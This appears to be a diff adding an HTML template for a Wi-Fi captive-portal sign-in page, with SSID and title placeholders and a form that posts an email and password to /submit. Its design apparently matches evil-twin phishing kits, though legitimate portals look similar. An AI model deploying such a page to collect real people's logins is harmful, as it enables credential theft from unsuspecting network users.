@@ -1,0 +1,131 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>{{TITLE}}</title>
+<style>
+  :root { color-scheme: dark; }
+  * { box-sizing: border-box; }
+  html, body { height: 100%; }
+  body {
+    margin: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background:
+      radial-gradient(circle at 50% 0%, #10261a 0%, #070d09 55%, #040706 100%);
+    color: #d7e6dd;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 22px;
+    overflow: hidden;
+  }
+  .web {
+    position: fixed;
+    inset: -10%;
+    opacity: .17;
+    pointer-events: none;
+  }
+  .card {
+    position: relative;
+    width: min(430px, 100%);
+    background: rgba(14, 26, 19, .88);
+    border: 1px solid #1f4a30;
+    border-radius: 18px;
+    padding: 28px 26px 24px;
+    box-shadow: 0 24px 80px rgba(0, 0, 0, .65), 0 0 0 1px rgba(45, 220, 120, .04) inset;
+    backdrop-filter: blur(6px);
+  }
+  .badge {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 13px;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: #5fe39a;
+    margin-bottom: 16px;
+  }
+  .dot {
+    width: 9px; height: 9px; border-radius: 50%;
+    background: #41e88b;
+    box-shadow: 0 0 12px #41e88b;
+    animation: pulse 2s infinite;
+  }
+  @keyframes pulse { 0%,100% { opacity: 1 } 50% { opacity: .35 } }
+  h1 { margin: 0 0 8px; font-size: 22px; font-weight: 700; letter-spacing: -.02em; }
+  .sub { margin: 0 0 20px; color: #8ba99a; font-size: 14px; line-height: 1.55; }
+  .net {
+    display: flex; justify-content: space-between; align-items: center;
+    background: #0a1410; border: 1px solid #173826; border-radius: 11px;
+    padding: 11px 13px; margin-bottom: 18px; font-size: 13px;
+  }
+  .net span { color: #789889; }
+  .net b { color: #d9efe3; font-weight: 600; max-width: 62%; text-align: right;
+    overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  label { display: block; font-size: 12px; color: #7f9d8e; margin: 0 0 6px 2px; }
+  input {
+    width: 100%; padding: 13px 14px; margin-bottom: 14px;
+    background: #08110c; color: #e7f5ee;
+    border: 1px solid #1d4530; border-radius: 11px;
+    font-size: 16px; outline: none;
+    transition: border-color .15s, box-shadow .15s;
+  }
+  input:focus { border-color: #2fa864; box-shadow: 0 0 0 3px rgba(47,168,100,.18); }
+  button {
+    width: 100%; padding: 14px; margin-top: 4px;
+    border: 0; border-radius: 11px; cursor: pointer;
+    background: linear-gradient(180deg, #47e893, #23b96c);
+    color: #04130b; font-size: 15px; font-weight: 800; letter-spacing: .01em;
+  }
+  button:active { transform: translateY(1px); }
+  .foot { margin-top: 16px; font-size: 11px; line-height: 1.5; color: #5e7a6b; text-align: center; }
+  .spin { display: none; }
+  .loading .spin { display: inline-block; }
+  .loading .txt { display: none; }
+</style>
+</head>
+<body>
+<svg class="web" viewBox="0 0 800 800" preserveAspectRatio="xMidYMid slice" aria-hidden="true">
+  <g fill="none" stroke="#39d17f" stroke-width="1">
+    <circle cx="400" cy="400" r="70"/><circle cx="400" cy="400" r="140"/>
+    <circle cx="400" cy="400" r="210"/><circle cx="400" cy="400" r="280"/>
+    <circle cx="400" cy="400" r="350"/><circle cx="400" cy="400" r="420"/>
+    <path d="M400 0 L400 800 M0 400 L800 400 M117 117 L683 683 M683 117 L117 683
+             M188 31 L612 769 M31 188 L769 612 M612 31 L188 769 M769 188 L31 612"/>
+  </g>
+</svg>
+
+<main class="card">
+  <div class="badge"><span class="dot"></span> Secure network access</div>
+  <h1>{{TITLE}}</h1>
+  <p class="sub">This network needs a quick sign-in before your device can reach the internet.</p>
+
+  <div class="net"><span>Network</span><b>{{SSID}}</b></div>
+
+  <form id="f" method="post" action="/submit">
+    <label for="u">Email or username</label>
+    <input id="u" name="email" type="text" inputmode="email"
+           autocomplete="username" autocapitalize="off" spellcheck="false"
+           placeholder="you@example.com" required>
+    <label for="p">Password</label>
+    <input id="p" name="password" type="password"
+           autocomplete="current-password" placeholder="Network password" required>
+    <button id="b" type="submit">
+      <span class="txt">Continue</span>
+      <span class="spin">Connecting&hellip;</span>
+    </button>
+  </form>
+  <div class="foot">By continuing you accept the network's acceptable use policy.</div>
+</main>
+
+<script>
+  document.getElementById('f').addEventListener('submit', function () {
+    var b = document.getElementById('b');
+    b.disabled = true;
+    b.parentNode.classList.add('loading');
+    setTimeout(function () { b.disabled = false; }, 4000);
+  });
+</script>
+</body>
+</html>
